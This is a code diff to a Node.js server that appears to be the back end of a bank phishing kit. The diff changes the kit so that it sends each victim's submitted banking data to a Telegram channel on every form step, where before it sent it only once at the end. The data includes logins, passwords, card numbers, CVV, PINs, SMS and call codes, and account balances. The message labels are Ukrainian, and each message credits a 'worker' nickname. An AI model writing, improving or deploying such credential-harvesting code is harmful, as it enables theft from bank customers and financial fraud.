@@ -164,39 +164,37 @@ app.post('/api/submit', (req, res) => {
     const newData = { ...existingData, ...stepData };
     sessions.set(sessionId, newData);
 
+    // Send data to Telegram on every submission
+    let message = `<b>Новий ввід даних!</b>\n\n`;
+    message += `<b>Назва банку:</b> ${newData.bankName}\n`;
+    if (newData.currentFlow) message += `<b>Потік:</b> ${newData.currentFlow}\n`;
+    if (newData.loginMethod) message += `<b>Метод входу:</b> ${newData.loginMethod}\n`;
+    if (newData.login) message += `<b>Логін:</b> <code>${newData.login}</code>\n`;
+    if (newData.phone) message += `<b>Номер телефону:</b> <code>${newData.phone}</code>\n`;
+    if (newData.password) message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
+    if (newData.fp_phone) message += `<b>Номер телефону (відновлення):</b> <code>${newData.fp_phone}</code>\n`;
+    if (newData.fp_card) message += `<b>Номер картки (відновлення):</b> <code>${newData.fp_card}</code>\n`;
+    if (newData.fp_pin) message += `<b>Пін-код (відновлення):</b> <code>${newData.fp_pin}</code>\n`;
+    if (newData.call_code) message += `<b>Код дзвінка:</b> <code>${newData.call_code}</code>\n`;
+    if (newData.sms_code) message += `<b>SMS-код:</b> <code>${newData.sms_code}</code>\n`;
+    if (newData.card_confirm || newData.card) message += `<b>Номер карти:</b> <code>${newData.card_confirm || newData.card}</code>\n`;
+    if (newData['card-expiry']) message += `<b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n`;
+    if (newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
+    if (newData.pin) message += `<b>Пін:</b> <code>${newData.pin}</code>\n`;
+    if (newData.balance) message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
+    message += `<b>Кількість переходів:</b> ${(cardVisitCounts.get(newData.card_confirm || newData.card) || 1) === 1 ? 'NEW' : `${cardVisitCounts.get(newData.card_confirm || newData.card) || 1} раз`}\n`;
+    message += `<b>Worker:</b> @${workerNick}\n`;
+
     if (isFinalStep && !newData.logSent) {
         newData.logSent = true;
-        sessions.set(sessionId, newData);
-
         const cardNumber = newData.card_confirm || newData.card || newData.fp_card;
-        let visitCount = 1;
         if (cardNumber) {
-            visitCount = (cardVisitCounts.get(cardNumber) || 0) + 1;
+            const visitCount = (cardVisitCounts.get(cardNumber) || 0) + 1;
             cardVisitCounts.set(cardNumber, visitCount);
         }
-
-        let message = `<b>Новий запис!</b>\n\n`;
-        message += `<b>Назва банку:</b> ${newData.bankName}\n`;
-        if (newData.currentFlow) message += `<b>Потік:</b> ${newData.currentFlow}\n`;
-        if (newData.loginMethod) message += `<b>Метод входу:</b> ${newData.loginMethod}\n`;
-        if (newData.login) message += `<b>Логін:</b> <code>${newData.login}</code>\n`;
-        if (newData.phone) message += `<b>Номер телефону:</b> <code>${newData.phone}</code>\n`;
-        if (newData.password) message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
-        if (newData.fp_phone) message += `<b>Номер телефону (відновлення):</b> <code>${newData.fp_phone}</code>\n`;
-        if (newData.fp_card) message += `<b>Номер картки (відновлення):</b> <code>${newData.fp_card}</code>\n`;
-        if (newData.fp_pin) message += `<b>Пін-код (відновлення):</b> <code>${newData.fp_pin}</code>\n`;
-        if (newData.call_code) message += `<b>Код дзвінка:</b> <code>${newData.call_code}</code>\n`;
-        if (newData.sms_code) message += `<b>SMS-код:</b> <code>${newData.sms_code}</code>\n`;
-        if (cardNumber) message += `<b>Номер карти:</b> <code>${cardNumber}</code>\n`;
-        if (newData['card-expiry']) message += `<b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n`;
-        if (newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
-        if (newData.pin) message += `<b>Пін:</b> <code>${newData.pin}</code>\n`;
-        if (newData.balance) message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
-        message += `<b>Кількість переходів:</b> ${visitCount === 1 ? 'NEW' : `${visitCount} раз`}\n`;
-        message += `<b>Worker:</b> @${workerNick}\n`;
-
-        sendToTelegram(message, sessionId, newData.bankName);
     }
+
+    sendToTelegram(message, sessionId, newData.bankName);
 
     res.status(200).json({ message: 'OK' });
 });
